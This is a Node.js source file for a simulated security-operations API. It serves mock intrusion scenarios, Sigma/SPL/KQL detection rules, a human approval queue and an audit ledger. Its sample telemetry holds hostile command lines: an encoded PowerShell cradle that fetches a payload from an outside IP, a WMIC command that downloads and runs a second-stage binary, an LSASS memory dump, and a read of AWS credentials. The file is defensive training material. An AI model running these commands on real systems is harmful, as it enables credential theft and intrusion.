// =========================================================================
// Sh4d0w_Br0k3rs Unified REST API Server & Telemetry Datastore
// Features: Relational Evidence Graph, Detection Engineering (Sigma/SPL/KQL),
// Human-in-the-Loop (HITL) Action Gating, Append-Only Audit Ledger, and RBAC
// =========================================================================

import http from 'http';
import url from 'url';

const PORT = process.env.PORT || 8000;

// In-Memory Database with Detection Rules, HITL Gating & Audit Ledger
const DB = {
  scenarios: [
    {
      id: 1,
      scenario_id: 'SCN-APT29-GHOST',
      name: 'Operation GhostToken: Hybrid Enterprise Infiltration',
      threat_actor: 'APT29 / Cozy Bear Archetype',
      target_environment: 'Hybrid (Windows Domain + AWS Cloud)',
      attack_vector: 'Spearphishing Attachment -> In-Memory Execution',
      impact: 'Critical data exfiltration of customer PII and database snapshots from AWS S3',
      description: 'Multi-stage intrusion beginning with spearphishing, pivoting through active directory with Kerberoasting, lateral movement via remote WMI, and exfiltrating AWS S3 cloud data through compromised IAM tokens.',
      total_events: 10
    },
    {
      id: 2,
      scenario_id: 'SCN-RANSOM-BLACKCAT',
      name: 'Double-Extortion Ransomware Campaign',
      threat_actor: 'ALPHV / BlackCat Archetype',
      target_environment: 'Enterprise On-Premise Network',
      attack_vector: 'VPN Credential Stuffing -> Admin RDP',
      impact: 'Operational disruption, critical shadow copies wiped, enterprise-wide file encryption',
      description: 'External perimeter compromise via VPN credential stuffing, RDP lateral movement, shadow copy deletion, mass data staging to cloud mega storage, followed by enterprise-wide encryption.',
      total_events: 7
    },
    {
      id: 3,
      scenario_id: 'SCN-CLOUD-CRYPTOMINE',
      name: 'Cloud-Native IAM Hijack & Compute Hijacking',
      threat_actor: 'TeamTNT / Cloud Threat Group',
      target_environment: 'AWS Cloud Infrastructure',
      attack_vector: 'Leaked Git Credentials -> IAM API Exploitation',
      impact: 'Mass cloud billing fraud ($45k/day GPU compute), potential infrastructure takeover',
      description: 'Compromised developer access key leading to privilege escalation, defense evasion by tampering with CloudTrail, and spinning up high-cost GPU instances for Monero mining.',
      total_events: 5
    },
    {
      id: 4,
      scenario_id: 'SCN-BRUTE-FORCE',
      name: 'Hydra Low-and-Slow SSH Password Spraying',
      threat_actor: 'External Adversary (IP: 185.220.101.44)',
      target_environment: 'auth-target-vm (10.42.0.12)',
      attack_vector: 'Throttled SSH spray with rockyou.txt (90s jitter)',
      impact: 'Credential compromise, privilege escalation, persistent access',
      description: 'Authentication failures distributed across a long window to evade naive rate-limiting thresholds, rotating across IP pools.',
      total_events: 14
    },
    {
      id: 5,
      scenario_id: 'SCN-CRED-STUFFING',
      name: 'Distributed Credential Stuffing (19 Proxies)',
      threat_actor: 'Botnet Cluster (RO/DE/US)',
      target_environment: 'identity-target-vm (10.42.0.15)',
      attack_vector: 'Residential proxy cluster rotating against OAuth gateway',
      impact: 'Mass account takeover and token minting',
      description: 'Coordinated source cluster authenticating against multiple corporate accounts with reused password dumps.',
      total_events: 19
    },
    {
      id: 6,
      scenario_id: 'SCN-PORT-SCAN',
      name: 'Nmap SYN Stealth Enclave Reconnaissance',
      threat_actor: 'Recon Node (91.121.44.77)',
      target_environment: 'edge-target-vm (10.42.0.10)',
      attack_vector: 'TCP SYN port sweep across 65,535 ports',
      impact: 'Fingerprinting of OS, daemons (SSH, HTTP, Nginx, PostgreSQL)',
      description: 'Single offensive node fanning out across enclave ports to identify exploitable entry points.',
      total_events: 12
    },
    {
      id: 7,
      scenario_id: 'SCN-SQL-INJECTION',
      name: 'Automated SQLMap Database Extraction',
      threat_actor: 'SQLMap Agent (194.26.29.112)',
      target_environment: 'api-target-vm (10.42.0.10)',
      attack_vector: 'Boolean-based blind & error-based SQL injection',
      impact: 'Full backend database schema and ledger table extraction',
      description: 'Automated SQL injection targeting query parameters to bypass auth and exfiltrate database contents.',
      total_events: 10
    },
    {
      id: 8,
      scenario_id: 'SCN-GHOST-TX',
      name: 'Ghost Transactions / Shadow Replay Latency Spike',
      threat_actor: 'Shadow Replay Engine (203.0.113.9)',
      target_environment: 'payments-target-vm (10.42.0.22)',
      attack_vector: 'High-concurrency API replay without auth cookies',
      impact: 'Severe p99 latency spikes (4,120ms) and payment queue denial of service',
      description: 'Burst of 240 synthetic transactions causing latency spikes during critical processing windows.',
      total_events: 15
    }
  ],

  // 1. Detection Engineering Rules (Sigma / SPL / KQL)
  detectionRules: [
    {
      id: 'SIGMA-001',
      title: 'Suspicious PowerShell Download Cradle via Encoded Command',
      format: 'Sigma',
      status: 'active',
      severity: 'high',
      mitre_technique: 'T1059.001',
      mitre_tactic: 'Execution',
      rule_content: `title: Suspicious PowerShell Download Cradle
id: 3b1e7c84-912f-488b-a384-918237192841
status: production
description: Detects base64 encoded PowerShell commands launching web client download cradles
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\\powershell.exe'
        CommandLine|contains:
            - '-enc'
            - '-encodedcommand'
            - 'downloadstring'
            - 'webclient'
    condition: selection
falsepositives:
    - Highly specialized administrative deployment scripts
level: high`,
      spl_query: 'index=endpoint process_name="powershell.exe" (command_line="*-enc*" OR command_line="*DownloadString*")',
      kql_query: 'event.domain: "endpoint" and process.name: "powershell.exe" and process.command_line: (*-enc* or *DownloadString*)'
    },
    {
      id: 'SIGMA-002',
      title: 'LSASS Process Memory Dump via Comsvcs DLL',
      format: 'Sigma',
      status: 'active',
      severity: 'critical',
      mitre_technique: 'T1003.001',
      mitre_tactic: 'Credential Access',
      rule_content: `title: LSASS Memory Dumping via Comsvcs.dll
id: 5a8e9f12-781c-4b92-b892-718293019284
status: production
description: Detects dumping of LSASS memory using rundll32 and comsvcs.dll MiniDump export
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\\rundll32.exe'
        CommandLine|contains:
            - 'comsvcs.dll'
            - 'MiniDump'
    condition: selection
level: critical`,
      spl_query: 'index=endpoint process_name="rundll32.exe" command_line="*comsvcs.dll*MiniDump*"',
      kql_query: 'event.domain: "endpoint" and process.name: "rundll32.exe" and process.command_line: (*comsvcs.dll* and *MiniDump*)'
    },
    {
      id: 'SIGMA-003',
      title: 'Volume Shadow Copy Deletion (Ransomware Preparation)',
      format: 'Sigma',
      status: 'active',
      severity: 'critical',
      mitre_technique: 'T1490',
      mitre_tactic: 'Defense Evasion',
      rule_content: `title: Volume Shadow Copy Deletion
id: 88f12a9c-341e-48a1-b841-928172948192
status: production
description: Detects deletion of Volume Shadow Copies using vssadmin or wmic
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\\vssadmin.exe'
            - '\\wmic.exe'
        CommandLine|contains:
            - 'delete shadows'
            - 'shadowcopy delete'
    condition: selection
level: critical`,
      spl_query: 'index=endpoint (process_name="vssadmin.exe" command_line="*delete shadows*") OR (process_name="wmic.exe" command_line="*shadowcopy delete*")',
      kql_query: 'event.domain: "endpoint" and process.name: ("vssadmin.exe" or "wmic.exe") and process.command_line: (*delete shadows* or *shadowcopy delete*)'
    },
    {
      id: 'SIGMA-004',
      title: 'AWS CloudTrail STS AssumeRole from Untrusted Foreign IP',
      format: 'KQL',
      status: 'active',
      severity: 'high',
      mitre_technique: 'T1078.004',
      mitre_tactic: 'Privilege Escalation',
      rule_content: `title: AWS STS AssumeRole from Non-Corporate CIDR
description: Identifies AWS CloudTrail AssumeRole API calls originating outside company IP blocks
kql: event.domain: "cloud" and cloud.action: "AssumeRole" and not (source.ip: 10.0.* or source.ip: 192.168.*)`,
      spl_query: 'index=cloud eventName="AssumeRole" NOT sourceIPAddress IN ("10.0.0.0/8", "192.168.0.0/16")',
      kql_query: 'event.domain: "cloud" and cloud.action: "AssumeRole" and not (source.ip: 10.* or source.ip: 192.168.*)'
    }
  ],

  // 2. Human-in-the-Loop (HITL) Action Gating Queue
  hitlGatingQueue: [
    {
      action_id: 'ACT-GATE-001',
      action_type: 'isolate_host',
      target: 'WKSTN-FIN-04',
      status: 'pending_approval',
      risk_level: 'High Impact',
      initiated_by: 'Aegis Threat AI Copilot',
      justification: 'Critical LSASS dump detected ([EVT-APT-004]). Immediate network quarantine recommended to halt active lateral traversal to Domain Controller.',
      blast_radius: '1 Workstation (Finance Dept), Active RDP sessions dropped, EDR sensor maintained',
      requested_at: '2026-11-17 08:35:12'
    },
    {
      action_id: 'ACT-GATE-002',
      action_type: 'revoke_session',
      target: 'CORP\\svc_sqladmin',
      status: 'pending_approval',
      risk_level: 'Critical Impact',
      initiated_by: 'SOC Analyst L2',
      justification: 'Kerberoasting ticket requested from unapproved workstation ([EVT-APT-005]). Active Kerberos tickets and password rotation required.',
      blast_radius: 'SQL Admin Service Account, 3 database maintenance batches may pause during rotation',
      requested_at: '2026-11-17 08:42:00'
    },
    {
      action_id: 'ACT-GATE-003',
      action_type: 'block_ip',
      target: '185.220.101.5',
      status: 'pending_approval',
      risk_level: 'Medium Impact',
      initiated_by: 'Aegis Threat AI Copilot',
      justification: 'Persistent C2 beaconing socket on port 443 ([EVT-APT-003]). Perimeter firewall null-route recommended.',
      blast_radius: 'Perimeter Firewall / WAF rule, 0 legitimate business endpoints affected',
      requested_at: '2026-11-17 08:45:30'
    }
  ],

  // 3. Append-Only Audit Ledger (audit_events)
  auditLedger: [
    {
      audit_id: 'AUD-001',
      timestamp: '2026-11-17 08:14:22 UTC',
      actor: 'System / Telemetry Ingestion Pipeline',
      role: 'SYSTEM',
      action: 'INGEST_TELEMETRY_BATCH',
      details: 'Ingested 10 security events for scenario SCN-APT29-GHOST across 4 domains.',
      status: 'COMMITTED',
      signature: 'sha256:8f3b92c4...e0a1'
    },
    {
      audit_id: 'AUD-002',
      timestamp: '2026-11-17 08:25:00 UTC',
      actor: 'Analyst (Noor Hassan)',
      role: 'L2 Threat Hunter',
      action: 'QUERY_EXECUTION',
      details: 'Executed KQL search: domain: "endpoint" and process.name: "powershell.exe"',
      status: 'LOGGED',
      signature: 'sha256:1a4c90d8...78b2'
    },
    {
      audit_id: 'AUD-003',
      timestamp: '2026-11-17 08:35:12 UTC',
      actor: 'Aegis Threat AI Copilot',
      role: 'AI_COPILOT',
      action: 'PROPOSE_CONTAINMENT_ACTION',
      details: 'Proposed host isolation for WKSTN-FIN-04 into HITL Approval Queue (ACT-GATE-001).',
      status: 'ENQUEUED',
      signature: 'sha256:4b912a7d...33c9'
    }
  ],

  events: [
    // Pre-populated events
    {
      id: 1,
      event_uuid: 'EVT-APT-001',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 08:14:22',
      domain: 'endpoint',
      event_type: 'process_creation',
      severity: 'medium',
      source_host: 'WKSTN-FIN-04',
      dest_host: 'WKSTN-FIN-04',
      source_ip: '10.0.1.44',
      dest_ip: null,
      user_id: 'sarah.connor',
      process_name: 'winword.exe',
      command_line: 'winword.exe /n "C:\\Users\\sarah.connor\\Downloads\\Q4_Executive_Bonus_Matrix.docm"',
      parent_process: 'explorer.exe',
      mitre_tactic: 'Initial Access',
      mitre_technique_id: 'T1566.001',
      mitre_technique_name: 'Spearphishing Attachment',
      raw_payload: { sha256: '8f3b92c4e1a0b3f88921cf81734bcda0e52719ba1c02', macro_enabled: true }
    },
    {
      id: 2,
      event_uuid: 'EVT-APT-002',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 08:14:25',
      domain: 'endpoint',
      event_type: 'process_creation',
      severity: 'high',
      source_host: 'WKSTN-FIN-04',
      dest_host: 'WKSTN-FIN-04',
      source_ip: '10.0.1.44',
      dest_ip: null,
      user_id: 'sarah.connor',
      process_name: 'powershell.exe',
      command_line: 'powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA1AC8AcABheWxvYWQuAHAAcwAxACIACQApAA==',
      parent_process: 'winword.exe',
      mitre_tactic: 'Execution',
      mitre_technique_id: 'T1059.001',
      mitre_technique_name: 'PowerShell Execution',
      raw_payload: { decoded: 'IEX (New-Object Net.WebClient).DownloadString("http://185.220.101.5/payload.ps1")', amsi_bypassed: true }
    },
    {
      id: 3,
      event_uuid: 'EVT-APT-003',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 08:16:10',
      domain: 'network',
      event_type: 'c2_beacon',
      severity: 'high',
      source_host: 'WKSTN-FIN-04',
      dest_host: 'c2-telemetry-sync.net',
      source_ip: '10.0.1.44',
      dest_ip: '185.220.101.5',
      user_id: 'sarah.connor',
      mitre_tactic: 'Command and Control',
      mitre_technique_id: 'T1071.001',
      mitre_technique_name: 'Web Protocols (C2)',
      raw_payload: { protocol: 'TLSv1.3', port: 443, jitter_pct: 12, beacon_interval_sec: 45 }
    },
    {
      id: 4,
      event_uuid: 'EVT-APT-004',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 08:22:05',
      domain: 'endpoint',
      event_type: 'process_creation',
      severity: 'critical',
      source_host: 'WKSTN-FIN-04',
      dest_host: 'WKSTN-FIN-04',
      source_ip: '10.0.1.44',
      user_id: 'sarah.connor',
      process_name: 'rundll32.exe',
      command_line: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 724 C:\\Users\\Public\\lsass.dmp full',
      parent_process: 'powershell.exe',
      mitre_tactic: 'Credential Access',
      mitre_technique_id: 'T1003.001',
      mitre_technique_name: 'LSASS Memory Dumping',
      raw_payload: { target_process: 'lsass.exe', dump_size: 48920192 }
    },
    {
      id: 5,
      event_uuid: 'EVT-APT-005',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 08:28:40',
      domain: 'auth',
      event_type: 'kerberos_request',
      severity: 'high',
      source_host: 'WKSTN-FIN-04',
      dest_host: 'DC01.corp.local',
      source_ip: '10.0.1.44',
      dest_ip: '10.0.0.5',
      user_id: 'sarah.connor',
      mitre_tactic: 'Credential Access',
      mitre_technique_id: 'T1558.003',
      mitre_technique_name: 'Kerberoasting',
      raw_payload: { service: 'MSSQLSvc/db01.corp.local:1433', encryption: '0x17 (RC4-HMAC)' }
    },
    {
      id: 6,
      event_uuid: 'EVT-APT-006',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 08:41:15',
      domain: 'endpoint',
      event_type: 'process_creation',
      severity: 'critical',
      source_host: 'WKSTN-FIN-04',
      dest_host: 'DC01.corp.local',
      source_ip: '10.0.1.44',
      dest_ip: '10.0.0.5',
      user_id: 'svc_sqladmin',
      process_name: 'wmic.exe',
      command_line: 'wmic.exe /node:10.0.0.5 /user:CORP\\svc_sqladmin process call create "cmd.exe /c powershell -c (New-Object Net.WebClient).DownloadFile(\'http://185.220.101.5/stage2.exe\', \'C:\\Windows\\Temp\\srvmgr.exe\') & C:\\Windows\\Temp\\srvmgr.exe"',
      parent_process: 'powershell.exe',
      mitre_tactic: 'Lateral Movement',
      mitre_technique_id: 'T1047',
      mitre_technique_name: 'Windows Management Instrumentation',
      raw_payload: { target_node: '10.0.0.5', remote_binary: 'srvmgr.exe' }
    },
    {
      id: 7,
      event_uuid: 'EVT-APT-007',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 08:50:02',
      domain: 'endpoint',
      event_type: 'file_access',
      severity: 'medium',
      source_host: 'WKSTN-FIN-04',
      dest_host: 'WKSTN-FIN-04',
      source_ip: '10.0.1.44',
      user_id: 'sarah.connor',
      process_name: 'cmd.exe',
      command_line: 'type C:\\Users\\sarah.connor\\.aws\\credentials',
      mitre_tactic: 'Credential Access',
      mitre_technique_id: 'T1552.001',
      mitre_technique_name: 'Credentials In Files',
      raw_payload: { file: '.aws/credentials', regex_match: 'aws_access_key_id' }
    },
    {
      id: 8,
      event_uuid: 'EVT-APT-008',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 09:05:18',
      domain: 'cloud',
      event_type: 'aws_api_call',
      severity: 'high',
      source_host: 'Unknown Client',
      dest_host: 'AWS Cloud (us-east-1)',
      source_ip: '185.220.101.5',
      dest_ip: 'AWS-STS-Endpoint',
      user_id: 'sarah.connor',
      cloud_service: 'STS',
      cloud_action: 'AssumeRole',
      mitre_tactic: 'Privilege Escalation',
      mitre_technique_id: 'T1078.004',
      mitre_technique_name: 'Cloud Accounts Compromise',
      raw_payload: { role_arn: 'arn:aws:iam::112233445566:role/ProductionDataOpsRole', mfa: false }
    },
    {
      id: 9,
      event_uuid: 'EVT-APT-009',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 09:12:44',
      domain: 'cloud',
      event_type: 'aws_api_call',
      severity: 'critical',
      source_host: 'AWS Cloud',
      dest_host: 'AWS S3 (us-east-1)',
      source_ip: '185.220.101.5',
      dest_ip: 'AWS-S3-Endpoint',
      user_id: 'ProductionDataOpsRole',
      cloud_service: 'S3',
      cloud_action: 'GetObject',
      mitre_tactic: 'Collection',
      mitre_technique_id: 'T1530',
      mitre_technique_name: 'Data from Cloud Storage',
      raw_payload: { bucket: 'corp-prod-financial-snapshots', download_bytes: 1492817203 }
    },
    {
      id: 10,
      event_uuid: 'EVT-APT-010',
      scenario_id: 'SCN-APT29-GHOST',
      timestamp: '2026-11-16 09:20:00',
      domain: 'network',
      event_type: 'data_exfiltration',
      severity: 'critical',
      source_host: 'AWS-Egress-Gateway',
      dest_host: 'External Recipient',
      source_ip: '185.220.101.5',
      dest_ip: '91.240.118.12',
      user_id: 'ProductionDataOpsRole',
      mitre_tactic: 'Exfiltration',
      mitre_technique_id: 'T1048',
      mitre_technique_name: 'Exfiltration Over Alternative Protocol',
      raw_payload: { bytes_out: 1540000000, dest_country: 'CH' }
    }
  ]
};

// Helper: send standard JSON response with CORS
function sendJson(res, data, statusCode = 200) {
  res.writeHead(statusCode, {
    'Content-Type': 'application/json; charset=utf-8',
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With'
  });
  res.end(JSON.stringify(data, null, 2));
}

// Request Router
const server = http.createServer((req, res) => {
  // CORS Preflight
  if (req.method === 'OPTIONS') {
    res.writeHead(200, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With'
    });
    res.end();
    return;
  }

  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname.replace(/\/$/, '');
  const query = parsedUrl.query;

  // Root / Status
  if (pathname === '' || pathname === '/' || pathname === '/api') {
    sendJson(res, {
      platform: 'Sh4d0w_Br0k3rs Evidence-Driven Platform API',
      status: 'operational',
      version: '3.0.0',
      architecture: 'FastAPI / Node API Core + MySQL / Relational Evidence Graph',
      features: [
        'Relational Evidence Graph',
        'Detection Engineering Studio (Sigma / SPL / KQL)',
        'Human-in-the-Loop (HITL) Action Gating',
        'Append-Only Audit Ledger (audit_events)',
        'Role-Based Access Control (L1 Triage, L2 Hunter, L3 Commander)'
      ]
    });
    return;
  }

  // Scenarios Catalog
  if (pathname === '/api/scenarios') {
    const sid = query.scenario_id;
    if (sid) {
      const found = DB.scenarios.find(s => s.scenario_id === sid);
      sendJson(res, { status: 'success', scenario: found || DB.scenarios[0] });
    } else {
      sendJson(res, { status: 'success', scenarios: DB.scenarios });
    }
    return;
  }

  // Detection Engineering Rules
  if (pathname === '/api/detections') {
    if (req.method === 'POST') {
      let body = '';
      req.on('data', chunk => { body += chunk; });
      req.on('end', () => {
        try {
          const rule = JSON.parse(body);
          rule.id = 'RULE-' + Date.now().toString(36).toUpperCase();
          rule.status = 'active';
          DB.detectionRules.unshift(rule);

          // Append to audit ledger
          DB.auditLedger.unshift({
            audit_id: 'AUD-' + Date.now(),
            timestamp: new Date().toUTCString(),
            actor: 'Detection Engineer',
            role: 'L2 Threat Hunter',
            action: 'CREATE_DETECTION_RULE',
            details: `Created rule ${rule.title} (${rule.format}) for technique ${rule.mitre_technique}`,
            status: 'COMMITTED',
            signature: 'sha256:' + Math.random().toString(36).substring(2, 10)
          });

          sendJson(res, { status: 'success', message: 'Detection rule deployed', rule }, 201);
        } catch (e) {
          sendJson(res, { error: 'Invalid JSON' }, 400);
        }
      });
      return;
    }
    sendJson(res, { status: 'success', count: DB.detectionRules.length, rules: DB.detectionRules });
    return;
  }

  // Human-in-the-Loop Action Gating Queue
  if (pathname === '/api/gating') {
    if (req.method === 'POST') {
      let body = '';
      req.on('data', chunk => { body += chunk; });
      req.on('end', () => {
        try {
          const { action_id, decision, analyst_name, reason } = JSON.parse(body);
          const item = DB.hitlGatingQueue.find(g => g.action_id === action_id);
          if (item) {
            item.status = decision === 'approve' ? 'approved_and_executed' : 'rejected_by_analyst';
            item.decision_by = analyst_name || 'L3 Incident Commander';
            item.decision_reason = reason || 'Operational verification completed';
            item.decided_at = new Date().toISOString();

            // Append to audit ledger
            DB.auditLedger.unshift({
              audit_id: 'AUD-' + Date.now(),
              timestamp: new Date().toUTCString(),
              actor: item.decision_by,
              role: 'L3 Incident Commander',
              action: decision === 'approve' ? 'HITL_ACTION_APPROVED' : 'HITL_ACTION_REJECTED',
              details: `${decision.toUpperCase()} action ${item.action_type} targeting ${item.target}. Reason: ${item.decision_reason}`,
              status: 'EXECUTED_AND_LOCKED',
              signature: 'sha256:' + Math.random().toString(36).substring(2, 10)
            });

            sendJson(res, { status: 'success', message: `Action ${decision}d successfully`, item });
          } else {
            sendJson(res, { error: 'Action not found in queue' }, 404);
          }
        } catch (e) {
          sendJson(res, { error: 'Invalid JSON' }, 400);
        }
      });
      return;
    }
    sendJson(res, { status: 'success', queue: DB.hitlGatingQueue });
    return;
  }

  // Append-Only Audit Ledger
  if (pathname === '/api/audit') {
    sendJson(res, { status: 'success', count: DB.auditLedger.length, ledger: DB.auditLedger });
    return;
  }

  // Events Query & Ingest
  if (pathname === '/api/events') {
    if (req.method === 'POST') {
      let body = '';
      req.on('data', chunk => { body += chunk; });
      req.on('end', () => {
        try {
          const payload = JSON.parse(body);
          const newEvent = {
            id: DB.events.length + 1,
            event_uuid: payload.event_uuid || ('EVT-ING-' + Math.random().toString(36).substring(2, 8).toUpperCase()),
            scenario_id: payload.scenario_id || 'SCN-APT29-GHOST',
            timestamp: payload.timestamp || new Date().toISOString().replace('T', ' ').substring(0, 19),
            domain: payload.domain || 'endpoint',
            event_type: payload.event_type || 'custom_alert',
            severity: payload.severity || 'high',
            source_host: payload.source_host || 'WKSTN-FIN-04',
            dest_host: payload.dest_host || null,
            source_ip: payload.source_ip || '10.0.1.44',
            dest_ip: payload.dest_ip || null,
            user_id: payload.user_id || 'analyst',
            process_name: payload.process_name || null,
            command_line: payload.command_line || null,
            mitre_tactic: payload.mitre_tactic || 'Execution',
            mitre_technique_id: payload.mitre_technique_id || 'T1059',
            mitre_technique_name: payload.mitre_technique_name || 'Command Line Execution',
            raw_payload: payload.raw_payload || {}
          };
          DB.events.unshift(newEvent);

          // Append to audit ledger
          DB.auditLedger.unshift({
            audit_id: 'AUD-' + Date.now(),
            timestamp: new Date().toUTCString(),
            actor: 'SOC Analyst / Telemetry Feed',
            role: 'DATA_INGEST',
            action: 'INGEST_SECURITY_EVENT',
            details: `Event ${newEvent.event_uuid} (${newEvent.domain}) indexed. Technique: ${newEvent.mitre_technique_id}`,
            status: 'COMMITTED',
            signature: 'sha256:' + Math.random().toString(36).substring(2, 10)
          });

          sendJson(res, { status: 'success', message: 'Event indexed in telemetry datastore', event: newEvent }, 201);
        } catch (err) {
          sendJson(res, { error: 'Invalid JSON payload' }, 400);
        }
      });
      return;
    }

    const scenarioId = query.scenario_id || 'SCN-APT29-GHOST';
    let results = DB.events.filter(e => scenarioId === 'ALL' || e.scenario_id === scenarioId);

    if (query.domain && query.domain !== 'ALL') results = results.filter(e => e.domain === query.domain);
    if (query.severity && query.severity !== 'ALL') results = results.filter(e => e.severity === query.severity);
    if (query.search) {
      const q = query.search.toLowerCase();
      results = results.filter(e => 
        e.event_uuid.toLowerCase().includes(q) ||
        (e.source_host && e.source_host.toLowerCase().includes(q)) ||
        (e.dest_host && e.dest_host.toLowerCase().includes(q)) ||
        (e.command_line && e.command_line.toLowerCase().includes(q))
      );
    }
    results.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
    sendJson(res, { status: 'success', count: results.length, events: results });
    return;
  }

  // Correlation Engine
  if (pathname === '/api/correlate') {
    const scenarioId = query.scenario_id || 'SCN-APT29-GHOST';
    const events = DB.events.filter(e => e.scenario_id === scenarioId);
    const users = new Set();
    const hosts = new Set();
    const tactics = new Set();
    const domains = new Set();

    events.forEach(e => {
      if (e.user_id) users.add(e.user_id);
      if (e.source_host) hosts.add(e.source_host);
      if (e.dest_host) hosts.add(e.dest_host);
      if (e.domain) domains.add(e.domain);
      if (e.mitre_tactic) tactics.add(e.mitre_tactic);
    });

    sendJson(res, {
      status: 'success',
      scenario_id: scenarioId,
      total_events_analyzed: events.length,
      incident_title: `Correlated Relational Evidence Graph: ${events.length} events across ${domains.size} domains`,
      confidence_score: 0.94,
      kill_chain_coverage: Array.from(tactics),
      entities_involved: { users: Array.from(users), hosts: Array.from(hosts) },
      hypothesis: `Adversary traversed ${tactics.size} MITRE ATT&CK tactics across ${domains.size} telemetry layers. Telemetry confirms unified adversarial intent.`
    });
    return;
  }

  // Attack Path & Evidence Graph
  if (pathname === '/api/attack_path') {
    const scenarioId = query.scenario_id || 'SCN-APT29-GHOST';
    const events = DB.events.filter(e => e.scenario_id === scenarioId);
    const nodesMap = {};
    const edges = [];

    events.forEach((evt, idx) => {
      const src = evt.source_host || evt.source_ip || 'External-Origin';
      const dst = evt.dest_host || evt.dest_ip || evt.cloud_service || 'Internal-Asset';

      if (!nodesMap[src]) nodesMap[src] = { id: src, label: src, type: src.includes('185.') || src.includes('c2') ? 'c2_server' : 'endpoint', compromised: true };
      if (!nodesMap[dst]) nodesMap[dst] = { id: dst, label: dst, type: dst.includes('DC01') || dst.includes('SRV') ? 'server' : dst.includes('AWS') || dst.includes('S3') ? 'cloud_resource' : 'endpoint', compromised: true };

      edges.push({
        id: `edge-${idx + 1}`,
        source: src,
        target: dst,
        label: evt.mitre_technique_name || evt.event_type,
        technique_id: evt.mitre_technique_id,
        tactic: evt.mitre_tactic,
        severity: evt.severity,
        event_uuid: evt.event_uuid
      });
    });

    sendJson(res, {
      status: 'success',
      scenario_id: scenarioId,
      nodes: Object.values(nodesMap),
      edges,
      blast_radius: { total_assets: Object.keys(nodesMap).length, pivots: edges.length }
    });
    return;
  }

  // MITRE Matrix
  if (pathname === '/api/mitre') {
    const scenarioId = query.scenario_id || 'SCN-APT29-GHOST';
    const events = DB.events.filter(e => e.scenario_id === scenarioId);
    const observed = {};

    events.forEach(evt => {
      if (evt.mitre_technique_id) {
        if (!observed[evt.mitre_technique_id]) {
          observed[evt.mitre_technique_id] = {
            technique_id: evt.mitre_technique_id,
            technique_name: evt.mitre_technique_name,
            tactic: evt.mitre_tactic,
            severity: evt.severity,
            hit_count: 0,
            event_uuids: []
          };
        }
        observed[evt.mitre_technique_id].hit_count++;
        observed[evt.mitre_technique_id].event_uuids.push(evt.event_uuid);
      }
    });

    sendJson(res, { status: 'success', scenario_id: scenarioId, total_techniques_mapped: Object.keys(observed).length, observed_techniques: observed });
    return;
  }

  // AI Assist
  if (pathname === '/api/ai_assist') {
    sendJson(res, {
      status: 'success',
      summary_title: 'APT29 GhostToken Hybrid Enterprise Intrusion & S3 Theft',
      executive_summary: 'Adversary initiated intrusion via spearphishing attachment on WKSTN-FIN-04 [EVT-APT-001], initiating base64-encoded PowerShell download cradles [EVT-APT-002] and establishing C2 beaconing to 185.220.101.5 [EVT-APT-003]. Memory dumping of LSASS [EVT-APT-004] and Kerberoasting against Domain Controller [EVT-APT-005] facilitated lateral movement via remote WMI [EVT-APT-006]. Workstation file inspection uncovered plaintext AWS secrets [EVT-APT-007], allowing the attacker to assume ProductionDataOpsRole [EVT-APT-008], download customer databases from S3 [EVT-APT-009], and exfiltrate 1.49 GB to foreign drop servers [EVT-APT-010].',
      confidence: 0.94,
      recommended_actions: [
        'Immediately isolate endpoint WKSTN-FIN-04 from corporate network.',
        'Reset Kerberos krbtgt account password twice and rotate svc_sqladmin password.',
        'Revoke all active STS assumed-role sessions for ProductionDataOpsRole.',
        'Block external IP addresses 185.220.101.5 and 91.240.118.12 at the perimeter firewall.'
      ]
    });
    return;
  }

  // Report
  if (pathname === '/api/report') {
    const scenarioId = query.scenario_id || 'SCN-APT29-GHOST';
    const events = DB.events.filter(e => e.scenario_id === scenarioId);
    sendJson(res, {
      status: 'success',
      report: {
        report_id: `IR-${Date.now().toString().slice(0, 8)}-${scenarioId.slice(4, 10)}`,
        title: 'State-Sponsored Hybrid Enterprise Intrusion & AWS S3 Exfiltration',
        scenario_id: scenarioId,
        classification: 'RESTRICTED // SOC-OPERATIONS',
        lead_analyst: query.analyst || 'Senior Threat Hunter',
        generated_at: new Date().toUTCString(),
        executive_summary: 'Multi-stage intrusion reconstructed across Endpoint, Active Directory, Network, and AWS Cloud infrastructure.',
        confidence_score: 0.94,
        timeline: events,
        evidence_chain: events.map(e => ({ item_id: e.event_uuid, timestamp: e.timestamp, status: 'Verified' }))
      }
    });
    return;
  }

  sendJson(res, { error: 'Endpoint not found', path: pathname }, 404);
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`[✓] Sh4d0w_Br0k3rs Unified API Server running on http://0.0.0.0:${PORT}`);
});
